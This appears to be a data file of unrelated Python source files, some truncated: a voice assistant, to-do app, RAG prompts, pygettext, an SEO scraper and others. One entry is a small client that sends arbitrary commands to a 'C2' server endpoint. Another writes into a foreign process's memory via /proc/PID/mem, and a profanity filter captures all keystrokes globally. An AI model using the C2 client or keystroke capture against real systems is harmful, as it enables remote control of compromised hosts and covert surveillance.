speechsdk.Connection.from_speech_synthesizer(speech_synthesizer)  \nconnection.open(True)  \n# Creates an instance of a keyword recognition model. Update this to  \n# point to the location of your keyword recognition model.  \nmodel = speechsdk.KeywordRecognitionModel(WakeupModelFile)  \n# The phrase your keyword recognition model triggers on.  \nkeyword = WakeupWord  \n# Set up the audio configuration  \naudio_config = speechsdk.audio.AudioConfig(use_default_microphone=True)  \n# Create a speech recognizer and start the recognition  \n#speech_recognizer = speechsdk.SpeechRecognizer(speech_config=speech_config, audio_config=audio_config)  \nauto_detect_source_language_config = speechsdk.languageconfig.AutoDetectSourceLanguageConfig(languages=[\"ja-JP\", \"zh-CN\"])  \nspeech_recognizer = speechsdk.SpeechRecognizer(speech_config=speech_config, audio_config=audio_config,  \n                                               auto_detect_source_language_config=auto_detect_source_language_config)  \nunknownCount = 0  \nsysmesg = {\"role\": \"system\", \"content\": os.environ[\"sysprompt_zh-CN\"]}  \ntts_sentence_end = [ \".\", \"!\", \"?\", \";\", \"\u3002\", \"\uff01\", \"\uff1f\", \"\uff1b\", \"\\n\" ]\n\n\nisListenning=False\ndef display_text(s):\n    print(s)\ndef speech_to_text():  \n    global unknownCount  \n    global lang,isListenning  \n    print(\"Please say...\")  \n    result = speech_recognizer.recognize_once_async().get()  \n    if result.reason == speechsdk.ResultReason.RecognizedSpeech:  \n        unknownCount = 0  \n        isListenning=False\n        return result.text  \n    elif result.reason == speechsdk.ResultReason.NoMatch:  \n        isListenning=False\n        unknownCount += 1  \n        error = os.environ[\"sorry_\" + lang]  \n        text_to_speech(error)  \n        return '...'  \n    elif result.reason == speechsdk.ResultReason.Canceled:  \n        isListenning=False\n        return \"speech recognizer canceled.\" \n    \n\ndef getVoiceSpeed():  \n    return 17  \n  \ndef text_to_speech(text, _lang=None):  \n    global lang  \n    try:  \n        result = buildSpeech(text).get()  \n        #result = speech_synthesizer.speak_ssml_async(ssml_text).get()  \n        if result.reason == speechsdk.ResultReason.SynthesizingAudioCompleted:  \n            print(\"Text-to-speech conversion successful.\")  \n            return \"Done.\"  \n        else:  \n            print(f\"Error synthesizing audio: {result}\")  \n            return \"Failed.\"  \n    except Exception as ex:  \n        print(f\"Error synthesizing audio: {ex}\")  \n        return \"Error occured!\"  \n        \ndef buildSpeech(text, _lang=None):\n    voice_lang = lang  \n    voice_name = \"zh-CN-XiaoxiaoMultilingualNeural\"  \n    ssml_text = f'''  \n        <speak xmlns=\"http://www.w3.org/2001/10/synthesis\" xmlns:mstts=\"http://www.w3.org/2001/mstts\" xmlns:emo=\"http://www.w3.org/2009/10/emotionml\" version=\"1.0\" xml:lang=\"{lang}\"><voice name=\"{voice_name}\"><lang xml:lang=\"{voice_lang}\"><prosody rate=\"{getVoiceSpeed()}%\">{text.replace('*', ' ')}</prosody></lang></voice></speak>  \n    '''  \n    print(f\"{voice_name} {voice_lang}!\")  \n    return speech_synthesizer.speak_ssml_async(ssml_text)\n  \ndef generate_text(prompt):  \n    global messages  \n    messages.append({\"role\": \"user\", \"content\": prompt})  \n    #tools = getTools()  \n    collected_messages = []\n    last_tts_request = None\n\n    split=True\n    result=''\n    \n    response_gen = client.chat.completions.create(\n        model=\"deepseek-chat\",\n        messages=messages[-20:],\n        stream=True\n    )\n    # \u5faa\u73af\u63a5\u6536\u8fd4\u56de\u7684message\n    for chunk in response_gen:\n        if chunk:\n            chunk_message =  chunk.choices[0].delta.content  # \u62bd\u53d6\u6d41\u5f0fmessage\u91cc\u7684\u5185\u5bb9\n            if chunk_message is not None:\n                c",
    "import logging\nimport os\nimport sys\nfrom PIL import Image\nfrom pillow_heif import register_heif_opener\n\nVALID_IMAGE_TYPES = [\".jpg\", \".gif\", \".png\", \".heic\"]\n\nlogger = logging.getLogger(__name__)\n\n\ndef score_photo(img):\n    pixel_value = img[0].getpixel((0, 0))\n    logger.info(pixel_value)\n    return sum(pixel_value) / (255 * 3)\n\n\ndef list_images_from_directory(input_dir):\n    imgs = []\n    for f in os.listdir(input_dir):\n        logger.info(f)\n        ext = os.path.splitext(f)[1]\n        if ext.lower() not in VALID_IMAGE_TYPES:\n            continue\n        imgs.append((Image.open(os.path.join(input_dir, f)), f))\n    return imgs\n\n\ndef write_photo(img, filename, output_dir):\n    img.save(os.path.join(output_dir, filename))\n\n\ndef choose_photos(input_dir=\"input_photos\", output_dir=\"output_photos\"):\n    logger.info(\"Choose photos\")\n    best_img = max(list_images_from_directory(input_dir), key=score_photo)\n    write_photo(best_img[0], best_img[1], output_dir)\n\n\nif __name__ == \"__main__\":\n    logging.basicConfig(filename=\"photo_picker.log\", level=logging.INFO)\n    register_heif_opener()\n    choose_photos(input_dir=sys.argv[1])\n    logger.info(\"Done\")\n",
    "from io import BufferedRandom\n\ndef get_stack_address_range(pid: str) -> tuple[int, int]:\n    with open(f\"/proc/{pid}/maps\", \"r\") as maps_file:\n        for line in maps_file:\n            if line.strip().endswith(\"[stack]\"):\n                start_address, end_address = line.split()[0].split(\"-\")\n                return int(start_address, 16), int(end_address, 16)\n    raise ValueError(\"Stack address range not found\")\n\ndef search_int_in_memory(memory: BufferedRandom, target_value: int, start_address: int, end_address: int) -> list[int]:\n    found_addresses = []\n    memory.seek(start_address)\n\n    while memory.tell() < end_address:\n        chunk = memory.read(4)\n        if not chunk:\n            break\n\n        value = int.from_bytes(chunk, byteorder=\"little\")\n        if value == target_value:\n            found_addresses.append(memory.tell() - 4)\n\n    return found_addresses\n\ndef read_ints_from_memory(memory: BufferedRandom, addresses: list[int]) -> list[int]:\n    values = []\n    for address in addresses:\n        memory.seek(address)\n        values.append(int.from_bytes(memory.read(4), byteorder=\"little\"))\n    return values\n\ndef main():\n    pid = input(\"Enter PID: \")\n    initial_value = int(input(\"Enter the initial value: \"))\n    start_address, end_address = get_stack_address_range(pid)\n\n    with open(f\"/proc/{pid}/mem\", \"rb+\") as memory:\n        addresses = search_int_in_memory(memory, initial_value, start_address, end_address)\n\n        while len(addresses) > 1:\n            print(f\"Total addresses ({len(addresses)}):\", [f\"{address:#x}\" for address in addresses])\n\n            new_value = input(\"Enter new value (input 'q' to exit loop): \")\n            if new_value.lower().startswith(\"q\"):\n                print(\"Exiting loop\")\n                return\n            new_value = int(new_value)\n\n            memory_values = read_ints_from_memory(memory, addresses)\n            addresses = [address for address, mem_v in zip(addresses, memory_values) if mem_v == new_value]\n\n        print(\"Only one address left... exiting loop\")\n        edit_it = input(f\"Do you wish to edit this address? {addresses[0]:#x} (y/n): \").lower()\n        if not edit_it.startswith(\"y\"):\n            print(\"Exiting...\")\n            return\n\n        while True:\n            change_to = input(\"What value to change it to? (input 'q' to exit): \")\n            if change_to.lower().startswith(\"q\"):\n                print(\"Exiting...\")\n                break\n\n            change_to = int(change_to)\n            memory.seek(addresses[0])\n            memory.write(change_to.to_bytes(4, byteorder=\"little\"))\n            memory.flush()\n\n            print(\"Value changed successfully!\")\n\nif __name__ == \"__main__\":\n    main()\n",
    "import subprocess\n\ndef send_command_to_server(command, server_url):\n    try:\n        # command structure\n        curl_command = [\n            \"curl\",\n            \"-X\", \"POST\",\n            \"-d\", f\"command={command}\",\n            f\"{server_url}/set_command\"\n        ]\n        # execution and output\n        result = subprocess.run(curl_command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)\n        if result.returncode == 0:\n            print(f\"Server output: {result.stdout.strip()}\")\n        else:\n            print(f\"Error: {result.stderr.strip()}\")\n    except Exception as e:\n        print(f\"Errore: {e}\")\n\ndef main():\n    server_url = input(\"Insert the C2 url (ex. http://127.0.0.1:80): \").strip()\n    \n    while True:\n        print(\"\\nMenu:\")\n        print(\"1. Exit\")\n        print(\"2. New command\")\n        \n        choice = input(\"Select an option: \").strip()\n        \n        if choice == \"1\":\n            print(\"Exit...\")\n            break\n        elif choice == \"2\":\n            command = input(\"New command: \").strip()\n            if command:\n                send_command_to_server(command, server_url)\n            else:\n                print(\"Error!\")\n        else:\n            print(\"Error!\")\n\nif __name__ == \"__main__\":\n    main()\n",
    "# Vazifalarni saqlash uchun ro'yxat\ntasks = []\n\n# Vazifalarni ko'rish funksiyasi\ndef view_tasks():\n    if not tasks:\n        print(\"Vazifalar ro'yxati bo'sh.\")\n    else:\n        print(\"\\nVazifalar ro'yxati:\")\n        for i, task in enumerate(tasks, 1):\n            print(f\"{i}. {task}\")\n\n# Yangi vazifa qo'shish funksiyasi\ndef add_task():\n    title = input(\"Vazifa nomini kiriting: \")\n    tasks.append(title)\n    print(\"Vazifa muvaffaqiyatli qo'shildi!\")\n\n# Vazifani tahrirlash funksiyasi\ndef edit_task():\n    view_tasks()\n    try:\n        task_no = int(input(\"Tahrirlamoqchi bo'lgan vazifa raqamini kiriting: \"))\n        if 1 <= task_no <= len(tasks):\n            new_title = input(\"Yangi vazifa nomini kiriting: \")\n            tasks[task_no - 1] = new_title\n            print(\"Vazifa muvaffaqiyatli tahrirlandi!\")\n        else:\n            print(\"Noto'g'ri raqam kiritildi.\")\n    except ValueError:\n        print(\"Faqat raqam kiriting.\")\n\n# Vazifani o'chirish funksiyasi\ndef delete_task():\n    view_tasks()\n    try:\n        task_no = int(input(\"O'chirmoqchi bo'lgan vazifa raqamini kiriting: \"))\n        if 1 <= task_no <= len(tasks):\n            tasks.pop(task_no - 1)\n            print(\"Vazifa muvaffaqiyatli o'chirildi!\")\n        else:\n            print(\"Noto'g'ri raqam kiritildi.\")\n    except ValueError:\n        print(\"Faqat raqam kiriting.\")\n\n# Vazifani tugallangan deb belgilash funksiyasi\ndef complete_task():\n    view_tasks()\n    try:\n        task_no = int(input(\"Tugallangan deb belgilamoqchi bo'lgan vazifa raqamini kiriting: \"))\n        if 1 <= task_no <= len(tasks):\n            tasks[task_no - 1] += \" [Tugallangan]\"\n            print(\"Vazifa tugallangan deb belgilandi!\")\n        else:\n            print(\"Noto'g'ri raqam kiritildi.\")\n    except ValueError:\n        print(\"Faqat raqam kiriting.\")\n\n# Asosiy menyu funksiyasi\ndef main_menu():\n    while True:\n        print(\"\\nTo-do ro'yxati menyusi:\")\n        print(\"1. Vazifalarni ko'rish\")\n        print(\"2. Vazifa qo'shish\")\n        print(\"3. Vazifani tahrirlash\")\n        print(\"4. Vazifani o'chirish\")\n        print(\"5. Vazifani tugallangan deb belgilash\")\n        print(\"6. Chiqish\")\n\n        choice = input(\"Tanlovingizni kiriting: \")\n\n        if choice == \"1\":\n            view_tasks()\n        elif choice == \"2\":\n            add_task()\n        elif choice == \"3\":\n            edit_task()\n        elif choice == \"4\":\n            delete_task()\n        elif choice == \"5\":\n            complete_task()\n        elif choice == \"6\":\n            print(\"Dastur tugatildi.\")\n            break\n        else:\n            print(\"Noto'g'ri tanlov. Qaytadan urinib ko'ring.\")\n\n# Dastur ishga tushiriladi\nif __name__ == \"__main__\":\n    main_menu()\n",
    "\"\"\"Default prompts.\"\"\"\n\n# Retrieval graph\n\nROUTER_SYSTEM_PROMPT = \"\"\"You are a Environmental Report specialized advocate. Your job is help people about in answer any informations about Environmental Report provided by Google.\n\nA user will come to you with an inquiry. Your first job is to classify what type of inquiry it is. The types of inquiries you should classify it as are:\n\n## `more-info`\nClassify a user inquiry as this if you need more information before you will be able to help them. Examples include:\n- The user complains about an information but doesn't provide the region\n- The user complains about an information but doesn't provide the year\n\n## `environmental`\nClassify a user inquiry as this if it can be answered by looking up information related to Environmental Report.  \\\nThe only topic allowed is about Environmental Report informations.\n\n## `general`\nClassify a user inquiry as this if it is just a general question or if the topic is not related to Environmental Report\"\"\"\n\nGENERAL_SYSTEM_PROMPT = \"\"\"You are a Environmental Report specialized advocate. Your job is help people about in answer any informations about Environmental Report provided by Google.\n\nYour boss has determined that the user is asking a general question, not one related to Environmental Report. This was their logic:\n\n<logic>\n{logic}\n</logic>\n\nRespond to the user. Politely decline to answer and tell them you can only answer questions about Environmental Report topics, and that if their question is about Environmental Report they should clarify how it is.\\\nBe nice to them though - they are still a user!\"\"\"\n\nMORE_INFO_SYSTEM_PROMPT = \"\"\"You are a Environmental Report specialized advocate. Your job is help people about in answer any informations about Environmental Report provided by Google.\n\nYour boss has determined that more information is needed before doing any research on behalf of the user. This was their logic:\n\n<logic>\n{logic}\n</logic>\n\nRespond to the user and try to get any more relevant information. Do not overwhelm them! Be nice, and only ask them a single follow up question.\"\"\"\n\nRESEARCH_PLAN_SYSTEM_PROMPT = \"\"\"You are a Environmental Report specialized advocate. Your job is help people about in answer any informations about Environmental Report provided by Google.\n\nBased on the conversation below, generate a plan for how you will research the answer to their question. \\\nThe plan should generally not be more than 2 steps long, it can be as short as one. The length of the plan depends on the question.\n\nYou have access to the following documentation sources:\n- Statistical data for each country\n- Informations provided in sentences\n- Tabular data\n\nYou do not need to specify where you want to research for all steps of the plan, but it's sometimes helpful.\"\"\"\n\nRESPONSE_SYSTEM_PROMPT = \"\"\"\\\nYou are an expert problem-solver, tasked with answering any question \\\nabout Environmental Report topics.\n\nGenerate a comprehensive and informative answer for the \\\ngiven question based solely on the provided search results (content). \\\nDo NOT ramble, and adjust your response length based on the question. If they ask \\\na question that can be answered in one sentence, do that. If 5 paragraphs of detail is needed, \\\ndo that. You must \\\nonly use information from the provided search results. Use an unbiased and \\\njournalistic tone. Combine search results together into a coherent answer. Do not \\\nrepeat text. Cite search results using [${{number}}] notation. Only cite the most \\\nrelevant results that answer the question accurately. Place these citations at the end \\\nof the individual sentence or paragraph that reference them. \\\nDo not put them all at the end, but rather sprinkle them throughout. If \\\ndifferent results refer to different entities within the same name, write separate \\\nanswers for each entity.\n\nYou should use bullet points in your answer for readability. Put citations where they apply\nrather than putting them all at the end. DO NOT PUT THEM ALL THAT END, PUT THEM IN THE BULLET POINTS.\n\nIf there is nothing in the context relevant to the question at hand, do NOT make up an answer. \\\nRather, tell them why you're unsure and ask for any additional information that may help you answer better.\n\nSometimes, what a user is asking may NOT be possible. Do NOT tell them that things are possible if you don't \\\nsee evidence for it in the context below. If you don't see based in the information below that something is possible, \\\ndo NOT say that it is - instead say that you're not sure.\n\nAnything between the following `context` html blocks is retrieved from a knowledge \\\nbank, not part of the conversation with the user.\n\n<context>\n    {context}\n<context/>\"\"\"\n\n# Researcher graph\n\nGENERATE_QUERIES_SYSTEM_PROMPT = \"\"\"\\\nIf the question is to be improved, understand the deep goal and generate 2 search queries to search for to answer the user's question. \\\n    \n\"\"\"\n\n\nCHECK_HALLUCINATIONS = \"\"\"You are a grader assessing whether an LLM generation is suppor",
    "# \u2588\u2588\u2588\u2557\u2591\u2591\u2588\u2588\u2557\u2588\u2588\u2557\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2557\u2588\u2588\u2557\u2591\u2591\u2591\u2591\u2591\u2588\u2588\u2557\u2588\u2588\u2557\u2591\u2591\u2588\u2588\u2557\u2591\u2591\u2591\u2588\u2588\u2588\u2588\u2588\u2588\u2557\u2591\u2588\u2588\u2588\u2588\u2588\u2588\u2557\u2591\u2591\u2588\u2588\u2588\u2588\u2588\u2557\u2591\n# \u2588\u2588\u2588\u2588\u2557\u2591\u2588\u2588\u2551\u2588\u2588\u2551\u255a\u2550\u2550\u2588\u2588\u2554\u2550\u2550\u255d\u2588\u2588\u2551\u2591\u2591\u2591\u2591\u2591\u2588\u2588\u2551\u255a\u2588\u2588\u2557\u2588\u2588\u2554\u255d\u2591\u2591\u2591\u2588\u2588\u2554\u2550\u2550\u2588\u2588\u2557\u2588\u2588\u2554\u2550\u2550\u2588\u2588\u2557\u2588\u2588\u2554\u2550\u2550\u2588\u2588\u2557\n# \u2588\u2588\u2554\u2588\u2588\u2557\u2588\u2588\u2551\u2588\u2588\u2551\u2591\u2591\u2591\u2588\u2588\u2551\u2591\u2591\u2591\u2588\u2588\u2551\u2591\u2591\u2591\u2591\u2591\u2588\u2588\u2551\u2591\u255a\u2588\u2588\u2588\u2554\u255d\u2591\u2591\u2591\u2591\u2588\u2588\u2588\u2588\u2588\u2588\u2554\u255d\u2588\u2588\u2588\u2588\u2588\u2588\u2554\u255d\u2588\u2588\u2551\u2591\u2591\u2588\u2588\u2551\n# \u2588\u2588\u2551\u255a\u2588\u2588\u2588\u2588\u2551\u2588\u2588\u2551\u2591\u2591\u2591\u2588\u2588\u2551\u2591\u2591\u2591\u2588\u2588\u2551\u2591\u2591\u2591\u2591\u2591\u2588\u2588\u2551\u2591\u2588\u2588\u2554\u2588\u2588\u2557\u2591\u2591\u2591\u2591\u2588\u2588\u2554\u2550\u2550\u2550\u255d\u2591\u2588\u2588\u2554\u2550\u2550\u2588\u2588\u2557\u2588\u2588\u2551\u2591\u2591\u2588\u2588\u2551\n# \u2588\u2588\u2551\u2591\u255a\u2588\u2588\u2588\u2551\u2588\u2588\u2551\u2591\u2591\u2591\u2588\u2588\u2551\u2591\u2591\u2591\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2557\u2588\u2588\u2551\u2588\u2588\u2554\u255d\u255a\u2588\u2588\u2557\u2588\u2588\u2557\u2588\u2588\u2551\u2591\u2591\u2591\u2591\u2591\u2588\u2588\u2551\u2591\u2591\u2588\u2588\u2551\u255a\u2588\u2588\u2588\u2588\u2588\u2554\u255d\n# \u255a\u2550\u255d\u2591\u2591\u255a\u2550\u2550\u255d\u255a\u2550\u255d\u2591\u2591\u2591\u255a\u2550\u255d\u2591\u2591\u2591\u255a\u2550\u2550\u2550\u2550\u2550\u2550\u255d\u255a\u2550\u255d\u255a\u2550\u255d\u2591\u2591\u255a\u2550\u255d\u255a\u2550\u255d\u255a\u2550\u255d\u2591\u2591\u2591\u2591\u2591\u255a\u2550\u255d\u2591\u2591\u255a\u2550\u255d\u2591\u255a\u2550\u2550\u2550\u2550\u255d\u2591\n\n\nimport os\n\nos.system(\"title Kiss Your Self\")\n\nimport sys\n\ntry:\n    sys.stdout.encoding = \"utf-8\"\nexcept Exception:\n    try:\n        sys.stdout.reconfigure(encoding=\"utf-8\")\n    except Exception:\n        pass\n\nimport time\nimport random\nfrom pynput.keyboard import Key, Listener, Controller\n\nprint(\n    \"\"\"\n===============================================================================\n\u2588\u2588\u2557\u2591\u2591\u2588\u2588\u2557\u2588\u2588\u2557\u2591\u2591\u2591\u2588\u2588\u2557\u2591\u2588\u2588\u2588\u2588\u2588\u2588\u2557\n\u2588\u2588\u2551\u2591\u2588\u2588\u2554\u255d\u255a\u2588\u2588\u2557\u2591\u2588\u2588\u2554\u255d\u2588\u2588\u2554\u2550\u2550\u2550\u2550\u255d    Kiss    <=>     Packaged with \ud83d\udc9d by nitLix\n\u2588\u2588\u2588\u2588\u2588\u2550\u255d\u2591\u2591\u255a\u2588\u2588\u2588\u2588\u2554\u255d\u2591\u255a\u2588\u2588\u2588\u2588\u2588\u2557\u2591    Your    <=>     Credits for inspiration to voj\n\u2588\u2588\u2554\u2550\u2588\u2588\u2557\u2591\u2591\u2591\u255a\u2588\u2588\u2554\u255d\u2591\u2591\u2591\u255a\u2550\u2550\u2550\u2588\u2588\u2557    Self    <=>     In loving memory of my sanity\n\u2588\u2588\u2551\u2591\u255a\u2588\u2588\u2557\u2591\u2591\u2591\u2588\u2588\u2551\u2591\u2591\u2591\u2588\u2588\u2588\u2588\u2588\u2588\u2554\u255d\n\u255a\u2550\u255d\u2591\u2591\u255a\u2550\u255d\u2591\u2591\u2591\u255a\u2550\u255d\u2591\u2591\u2591\u255a\u2550\u2550\u2550\u2550\u2550\u255d\u2591\n===============================================================================\n\"\"\"\n)\n# Set up word storage\n\nstorage = \"\"\n\n# Keys being held\nheld = []\n\nall_selected = False\n\nprofanity = {}\npositivityModeMessage = \"\"\n\ncontroller = Controller()\n\n\ndef main():\n\n    # Set working directory to src\n\n    workDir = os.path.dirname(os.path.abspath(sys.executable))\n    if (\"windowsapps\" in workDir.lower()) or (\"program files\" in workDir.lower()):\n        print(\"Manual run detected, swapping directory...\")\n        workDir = os.path.dirname(os.path.abspath(__file__))\n\n    os.chdir(workDir)\n\n    try:\n        with open(\"profanity.txt\", \"r\") as f:\n            for line in f:\n                data = line.split(\"-\")\n                profanity[data[0]] = data[1].replace(\"\\n\", \"\")\n    except Exception as e:\n        print(f\"Error reading profanity file: {e}\")\n        return\n\n    try:\n        with open(\"positivitymode.txt\", \"r\") as f:\n            positivityModeMessage = f.read()\n    except FileNotFoundError:\n        print(\"Positivity Mode file not found\")\n        return\n    except Exception as e:\n        print(f\"Error reading Positivity Mode file: {e}\")\n        return\n\n    print(\"Imported profanity...\")\n\n    def process_key(key):\n        return (\n            str(key)\n            .replace(\"'\", \"\")\n            .replace(\"1\", \"i\")\n            .replace(\"0\", \"o\")\n            .replace(\"2\", \"z\")\n            .replace(\"3\", \"e\")\n            .replace(\"4\", \"a\")\n            .replace(\"5\", \"s\")\n            .replace(\"6\", \"g\")\n            .replace(\"7\", \"t\")\n            .replace(\"8\", \"b\")\n            .replace(\"9\", \"g\")\n            .lower()\n        )\n\n    nonspecial = [\n        \"a\",\n        \"b\",\n        \"c\",\n        \"d\",\n        \"e\",\n        \"f\",\n        \"g\",\n        \"h\",\n        \"i\",\n        \"j\",\n        \"k\",\n        \"l\",\n        \"m\",\n        \"n\",\n        \"o\",\n        \"p\",\n        \"q\",\n        \"r\",\n        \"s\",\n        \"t\",\n        \"u\",\n        \"v\",\n        \"w\",\n        \"x\",\n        \"y\",\n        \"z\",\n        \" \",\n    ]\n\n    # Set up keyboard listener\n    def on_press(key):\n        global storage\n        global held\n        global all_selected\n\n        # convert key to string\n        raw_key = process_key(key)\n        if raw_key not in held:\n            held.append(raw_key)\n\n        if len(raw_key) == 1 and \"key.ctrl_l\" not in held:\n            storage += raw_key\n\n        if raw_key == \"key.space\":\n            storage += \" \"\n\n        if raw_key == \"key.enter\":\n            storage = \"\"\n\n        if raw_key == \"\\\\xoi\":\n            all_selected = True\n\n        if raw_key == \"\\\\xoe\":\n            print(\"Bye bye!\")\n            exit()\n\n        if raw_key == \"key.backspace\":\n            if all_selected:\n                storage = \"\"\n                all_selected = False\n                return\n\n            if \"key.ctrl_l\" in held:\n                # Cut off letters until space reached or beginning of string\n                special = False\n                space = False\n                erased = 0\n\n                if len(storage) == 0:\n                    return\n\n                if storage[-1] not in nonspecial:\n                    # Start special character erase, erase until nonspecial character is reached\n                    while True:\n                        if len(storage) == 0:\n                            break\n\n                        if storage[-1] in nonspecial:\n                            break\n\n                        storage = storage[:-1]\n                else:\n                    # Start normal erase. Wait until alphabet reached, then erase until space\n                    # Stop at beginning of string\n\n                    alphabetReached = False\n                    while True:\n                        if len(storage) == 0:\n                            break\n\n                        if alphabetReached and storage[-1] == \" \":\n                            break\n\n            ",
    "#! /usr/bin/env python3\n# -*- coding: iso-8859-1 -*-\n# Originally written by Barry Warsaw <barry@python.org>\n#\n# Minimally patched to make it even more xgettext compatible\n# by Peter Funk <pf@artcom-gmbh.de>\n#\n# 2002-11-22 J\u00fcrgen Hermann <jh@web.de>\n# Added checks that _() only contains string literals, and\n# command line args are resolved to module lists, i.e. you\n# can now pass a filename, a module or package name, or a\n# directory (including globbing chars, important for Win32).\n# Made docstring fit in 80 chars wide displays using pydoc.\n#\n\n# for selftesting\ntry:\n    import fintl\n    _ = fintl.gettext\nexcept ImportError:\n    _ = lambda s: s\n\n__doc__ = _(\"\"\"pygettext -- Python equivalent of xgettext(1)\n\nMany systems (Solaris, Linux, Gnu) provide extensive tools that ease the\ninternationalization of C programs. Most of these tools are independent of\nthe programming language and can be used from within Python programs.\nMartin von Loewis' work[1] helps considerably in this regard.\n\nThere's one problem though; xgettext is the program that scans source code\nlooking for message strings, but it groks only C (or C++). Python\nintroduces a few wrinkles, such as dual quoting characters, triple quoted\nstrings, and raw strings. xgettext understands none of this.\n\nEnter pygettext, which uses Python's standard tokenize module to scan\nPython source code, generating .pot files identical to what GNU xgettext[2]\ngenerates for C and C++ code. From there, the standard GNU tools can be\nused.\n\nA word about marking Python strings as candidates for translation. GNU\nxgettext recognizes the following keywords: gettext, dgettext, dcgettext,\nand gettext_noop. But those can be a lot of text to include all over your\ncode. C and C++ have a trick: they use the C preprocessor. Most\ninternationalized C source includes a #define for gettext() to _() so that\nwhat has to be written in the source is much less. Thus these are both\ntranslatable strings:\n\n    gettext(\"Translatable String\")\n    _(\"Translatable String\")\n\nPython of course has no preprocessor so this doesn't work so well.  Thus,\npygettext searches only for _() by default, but see the -k/--keyword flag\nbelow for how to augment this.\n\n [1] https://www.python.org/workshops/1997-10/proceedings/loewis.html\n [2] https://www.gnu.org/software/gettext/gettext.html\n\nNOTE: pygettext attempts to be option and feature compatible with GNU\nxgettext where ever possible. However some options are still missing or are\nnot fully implemented. Also, xgettext's use of command line switches with\noption arguments is broken, and in these cases, pygettext just defines\nadditional switches.\n\nUsage: pygettext [options] inputfile ...\n\nOptions:\n\n    -a\n    --extract-all\n        Extract all strings.\n\n    -d name\n    --default-domain=name\n        Rename the default output file from messages.pot to name.pot.\n\n    -E\n    --escape\n        Replace non-ASCII characters with octal escape sequences.\n\n    -D\n    --docstrings\n        Extract module, class, method, and function docstrings.  These do\n        not need to be wrapped in _() markers, and in fact cannot be for\n        Python to consider them docstrings. (See also the -X option).\n\n    -h\n    --help\n        Print this help message and exit.\n\n    -k word\n    --keyword=word\n        Keywords to look for in addition to the default set, which are:\n        %(DEFAULTKEYWORDS)s\n\n        You can have multiple -k flags on the command line.\n\n    -K\n    --no-default-keywords\n        Disable the default set of keywords (see above).  Any keywords\n        explicitly added with the -k/--keyword option are still recognized.\n\n    --no-location\n        Do not write filename/lineno location comments.\n\n    -n\n    --add-location\n        Write filename/lineno location comments indicating where each\n        extracted string is found in the source.  These lines appear before\n        each msgid.  The style of comments is controlled by the -S/--style\n        option.  This is the default.\n\n    -o filename\n    --output=filename\n        Rename the default output file from messages.pot to filename.  If\n        filename is `-' then the output is sent to standard out.\n\n    -p dir\n    --output-dir=dir\n        Output files will be placed in directory dir.\n\n    -S stylename\n    --style stylename\n        Specify which style to use for location comments.  Two styles are\n        supported:\n\n        Solaris  # File: filename, line: line-number\n        GNU      #: filename:line\n\n        The style name is case insensitive.  GNU style is the default.\n\n    -v\n    --verbose\n        Print the names of the files being processed.\n\n    -V\n    --version\n        Print the version of pygettext and exit.\n\n    -w columns\n    --width=columns\n        Set width of output to columns.\n\n    -x filename\n    --exclude-file=filename\n        Specify a file that contains a list of strings that are not be\n        extracted from the input files.  Each string to be excluded must\n        appear on a line by itself in the file.\n\n    -X ",
    "import os\r\nimport pickle\r\nimport tkinter as tk\r\nfrom tkinter import messagebox\r\nimport webbrowser\r\nimport requests\r\nfrom bs4 import BeautifulSoup\r\nfrom openpyxl import Workbook\r\n\r\n\r\ndef get_script_dir():\r\n    \"\"\"Get the directory of the current script.\"\"\"\r\n    try:\r\n        return os.path.dirname(os.path.abspath(__file__))\r\n    except NameError:\r\n        return os.getcwd()\r\n\r\n\r\ndef load_settings():\r\n    \"\"\"Load settings from the 'settings.pkl' file.\"\"\"\r\n    settings_file = os.path.join(get_script_dir(), 'settings.pkl')\r\n    if os.path.exists(settings_file):\r\n        with open(settings_file, 'rb') as f:\r\n            settings = pickle.load(f)\r\n            if 'user_agent' not in settings:\r\n                settings['user_agent'] = ''\r\n            if 'urls' not in settings:\r\n                settings['urls'] = []\r\n            if 'proxies' not in settings:\r\n                settings['proxies'] = []\r\n            return settings\r\n    else:\r\n        return {\r\n            'user_agent': '',\r\n            'urls': [],\r\n            'proxies': []  # Format: [{'ip': '...', 'login': '...', 'password': '...'}]\r\n        }\r\n\r\n\r\ndef save_settings(settings):\r\n    \"\"\"Save settings to the 'settings.pkl' file.\"\"\"\r\n    settings_file = os.path.join(get_script_dir(), 'settings.pkl')\r\n    with open(settings_file, 'wb') as f:\r\n        pickle.dump(settings, f)\r\n\r\n\r\ndef check_google_indexation(settings):\r\n    \"\"\"Check if URLs are indexed in Google.\"\"\"\r\n    headers = {'User-Agent': settings['user_agent']}\r\n    urls = settings['urls']\r\n    proxies = settings['proxies']\r\n    use_proxies = bool(proxies)  # Check if proxies are provided\r\n    current_proxy_index = 0  # Index of the current proxy, if available\r\n\r\n    results = {}\r\n    for url in urls:\r\n        while True:\r\n            try:\r\n                # Configure proxy with login and password\r\n                if use_proxies:\r\n                    proxy_info = proxies[current_proxy_index]\r\n                    proxy = {\r\n                        'http': f\"http://{proxy_info['login']}:{proxy_info['password']}@{proxy_info['ip']}\",\r\n                        'https': f\"http://{proxy_info['login']}:{proxy_info['password']}@{proxy_info['ip']}\"\r\n                    }\r\n                else:\r\n                    proxy = None\r\n\r\n                search_url = f\"https://www.google.com/search?q=site:{url}\"\r\n                response = requests.get(search_url, headers=headers, proxies=proxy, timeout=10)\r\n                response.raise_for_status()\r\n\r\n                soup = BeautifulSoup(response.text, 'html.parser')\r\n                search_results = soup.find_all('div', class_='tF2Cxc')\r\n\r\n                if search_results:\r\n                    results[url] = \"Indexed\"\r\n                else:\r\n                    results[url] = \"Not Indexed\"\r\n                break  # Exit loop on successful check\r\n            except requests.exceptions.ProxyError:\r\n                if use_proxies:\r\n                    current_proxy_index += 1\r\n                    if current_proxy_index >= len(proxies):\r\n                        results[url] = \"Error: All proxies failed\"\r\n                        break\r\n                else:\r\n                    results[url] = \"Error: No proxy available\"\r\n                    break\r\n            except requests.exceptions.Timeout:\r\n                results[url] = \"Error: Request timeout\"\r\n                break\r\n            except requests.exceptions.RequestException as e:\r\n                results[url] = f\"Error: {str(e)}\"\r\n                break\r\n\r\n    # Save the results to an Excel file\r\n    save_results_to_excel(results)\r\n\r\n\r\ndef save_results_to_excel(results):\r\n    \"\"\"Save the results to an Excel file.\"\"\"\r\n    script_dir = get_script_dir()\r\n    output_file = os.path.join(script_dir, \"indexation_results.xlsx\")\r\n    workbook = Workbook()\r\n    sheet = workbook.active\r\n    sheet.title = \"Indexation Results\"\r\n    